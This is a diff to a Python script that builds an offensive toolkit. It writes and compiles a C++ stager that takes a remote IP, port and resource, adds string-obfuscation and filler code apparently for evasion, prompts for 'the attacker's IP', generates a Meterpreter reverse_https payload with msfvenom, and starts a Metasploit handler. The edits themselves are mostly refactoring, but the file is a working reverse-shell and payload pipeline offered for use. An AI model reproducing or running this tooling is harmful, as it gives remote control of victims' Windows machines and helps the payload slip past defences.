@@ -5,12 +5,36 @@ cpp_template = '''\
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <stdio.h>
+#include <string>
 
 #pragma comment (lib, "Ws2_32.lib")
 #pragma comment (lib, "Mswsock.lib")
 #pragma comment (lib, "AdvApi32.lib")
 
 #define DEFAULT_BUFLEN 4096
+
+// Function declaration
+void a(char* b, char* c, char* d);
+
+// Obfuscated strings
+std::string obfuscateString(const std::string& str) {
+    std::string obfuscatedStr;
+    // Obfuscation logic goes here
+    return obfuscatedStr;
+}
+
+int main(int argc, char** argv) {
+    if (argc != 4) {
+        printf("[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\\n", argv[0]);
+        return 1;
+    }
+    a(argv[1], argv[2], argv[3]);
+    int x = 10;
+    for (int i = 0; i < x; i++) {
+        // Meaningless code snippet
+    }
+    return 0;
+}
 
 void a(char* b, char* c, char* d) {
     DWORD e = 0;
@@ -114,19 +138,6 @@ void a(char* b, char* c, char* d) {
     closesocket(l);
     WSACleanup();
 }
-
-int main(int argc, char** argv) {
-    if (argc != 4) {
-        printf("[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\\n", argv[0]);
-        return 1;
-    }
-    a(argv[1], argv[2], argv[3]);
-    int x = 10;
-    for (int i = 0; i < x; i++) {
-        // Meaningless code snippet
-    }
-    return 0;
-}
 '''
 
 # Save the C++ template to a file
@@ -143,9 +154,9 @@ except subprocess.CalledProcessError as e:
     print(e.output.decode('utf-8'))
 
 
-# Remove Process File
-remove = "rm -r template.cpp"
-subprocess.run(remove, shell=True, check=True)
+# Remove template.cpp file
+remove_command = "rm -f template.cpp"
+subprocess.run(remove_command, shell=True, check=True)
 
 
 # Generate OpenSSL certificate
@@ -162,10 +173,9 @@ try:
 except subprocess.CalledProcessError as e:
     print(f"Error generating OpenSSL certificate: {e}")
 
-# Prompt attacker for IP, port, and certificate file
+# Prompt attacker for IP and port
 attacker_ip = input("Enter the attacker's IP: ")
 attacker_port = input("Enter the attacker's port: ")
-
 
 # Create msfconfig.rc
 msfconfig_content = f'''
@@ -178,11 +188,12 @@ set HandlerSSLCert www.example.com.pem
 run
 '''
 
-msfconfig_filename = 'msfconfig.rc'
-with open(msfconfig_filename, 'w') as file:
+with open('msfconfig.rc', 'w') as file:
     file.write(msfconfig_content)
 
+
 print("msfconfig.rc created.")
+
 
 # Generate the beacon.bin payload using msfvenom
 payload_file = 'beacon.bin'
@@ -190,7 +201,7 @@ payload_command = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={att
 subprocess.run(payload_command, shell=True)
 
 # Execute msfconsole with the resource file
-msfconsole_cmd = f'msfconsole -q -r {msfconfig_filename}'
+msfconsole_cmd = f'msfconsole -q -r msfconfig.rc'
 
 try:
     subprocess.run(msfconsole_cmd, shell=True, check=True)
